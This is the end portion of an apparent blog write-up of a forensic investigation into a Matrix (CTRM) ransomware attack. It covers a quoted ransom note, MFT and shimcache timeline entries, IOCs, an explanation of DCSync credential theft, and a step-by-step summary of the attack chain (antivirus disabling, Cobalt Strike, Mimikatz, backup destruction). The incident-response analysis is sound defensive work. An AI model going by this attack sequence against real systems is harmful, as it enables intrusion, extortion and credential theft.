Sоrry, but wе hаvе tо infоrm yоu thаt duе tо sесurity issuеs, yоur sеrvеr wаs hасkеd. Plеаsе bе surе thаt yоur dаtа is nоt brоkеn. All yоur vаluаblе filеs wеrе еnсryptеd with strоng сryptо аlgоrithms AES-256+RSA-2048 аnd rеnаmеd. Yоu саn rеаd аbоut thеsе аlgоrithms in Gооglе. Yоur uniquе dесryptiоn kеy is sесurеly stоrеd оn оur sеrvеr аnd yоur dаtа саn bе dесryptеd fаst аnd sаfеly.
[...]
```

it's a ransome note.

__On the 2021-01-07 at 04:20:59, the first ransome note from CTRM was created on the disk, meaning that the ransomware was executed on the machine__


We have the confirmation that the ransomware execution was successfull as we witness the start of the encryption in the MFT. A lot of file are created/modified and share the same naming pattern :

```bash
2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files (x86)\CMAK\Support\Previous releases\[Citrteam@hotmail.com].DvXRC02y-8Yeneq3z.CTRM
2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files\VMware\VMware Tools\VMware VGAuth\[Citrteam@hotmail.com].kxAL47t3-yygBS2r4.CTRM
2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files\VMware\VMware Tools\VMware VGAuth\schemas\[Citrteam@hotmail.com].COdAClxC-xrdul1K7.CTRM
2021-01-07|04:21:10.195451|mft|FILESTAT|file|Metadata Modification Time|\System Volume Information\DFSR\database_665A_45F5_5A45_C313\[Citrteam@hotmail.com].Efm1dxRl-Z6nxgXnG.CTRM
```

It match 2 iocs related to Matrix ransomware families:
* The name contains "Citrteam[@]hotmail[.]com"
* The file extension is  : "CTRM".


__The attack methodologies and IOCs are caracteristic of Matrix's ransomwares__


---

__On the 2021-01-07 from 04:20:51 to 04:21:13, the attacker successfully used scripts to prepare file for encryption, deleted shadow copies and backups using a scheduled task and started the encryption of files.__

---


## Stealing datas


It's pretty common for an attacker to steal datas as well to have another leverage to make sure that the victim will pay the ransom.

Later in time we witness the execution of ActiveDirectorySync :
```bash
timeline.csv
2021-01-07|04:19:41.086045|shimcache|ActiveDirectorySync.exe|C:\Users\Administrator\Documents\ActiveDirectorySync.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
2021-01-07|04:19:41.086045|shimcache|NWcurdcz.exe|C:\Users\Administrator\Documents\NWcurdcz.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
```

Using ActiveDirectorySync.exe allow an attacker to do a DCSync attack.
It's a technique that is typically used to steal credentials from an AD database. The attacker impersonates a domain controller (DC) to request password hashes from a target DC, using the Directory Replication Services (DRS) Remote Protocol. The attack can be used to effectively “pull” password hashes from the DC, without needing to run code on the DC itself. [source](https://www.semperis.com/blog/dcsync-attack/)


The file "NWcurdcz.exe" wasn't on the disk anymore so I couldn't investigate any further.


---

__On the 2021-01-07 at 04:19:41, the attacker successfully leverage ActiveDirectorySync.exe to steals important data from the victim.__

---


I can't find any other following action from the attacker.


It's not that irrelevant as he pwnd all the infrastructure, successfully executed the ransomware, dropped a remote access tool and stole a lot of sensitives informations.


## Conclusion


With this investigation we could follow every step of the attack on this machine.
We can sum up the attack methodologie like so:


1. Connect from another machine with a privileged user
2. Disable the antivirus
3. Drop backdoor and remote access tool (cobalt strike)
4. Use Mimikatz to get higher user privileges or to anchor deeper within the system
5. Use scripts to make surе that all file can be encrypted without problem
6. Use script to destroy every backup or SHADOWCOPY
7. Execute ransomware
8. Steal datas using ActiveDirectorySync.


## The end


This is the end of this article, I hope you enjoyed it !


I'll be pleased to talk about it :)





